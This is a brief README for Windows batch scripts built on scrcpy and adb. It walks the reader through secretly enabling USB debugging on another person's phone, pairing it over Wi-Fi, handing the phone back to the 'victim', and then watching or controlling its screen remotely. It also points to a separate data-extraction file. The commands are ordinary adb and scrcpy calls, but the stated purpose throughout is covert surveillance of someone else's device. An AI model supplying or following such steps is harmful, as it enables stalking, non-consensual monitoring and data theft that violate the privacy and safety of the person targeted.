# Scrcpy
SCRCPY for windows
First Extract Zip file to a specific folder.
then for auto processing paste .bat files to that extracted path.
then edit bat files and put the required device ip (go to mobile wifi->setting of connected wifi->scroll down->ip address)
Read the readme.txt file for modiciations and requirement.
Fist time connection requires usb cable.
and first enable usb debugging (-> setting->about->build number ->tap it 7 times-> go to developer options/search it in mobile settings-> enable usb debugging->connect usb cable and run scrcpy connect.bat)
after that you can clear cable and return mobile to victim.
now for only observation to watch victims mobile run oneclickscrcpy Watch.bat
and for using screen as well run oneclickscrcpy.bat 
For Data Extraction read Data Copy.txt


For device checkup. open cloudshell in extracted folder
run adb devices
then run .\scrcpy -s ip:5555



if .bat file is opening auto into powershell then add .\ before scrcpy

Now incase connecting to device 2 if getting connection error.
adb disconnect
adb kill-server
adb start-server
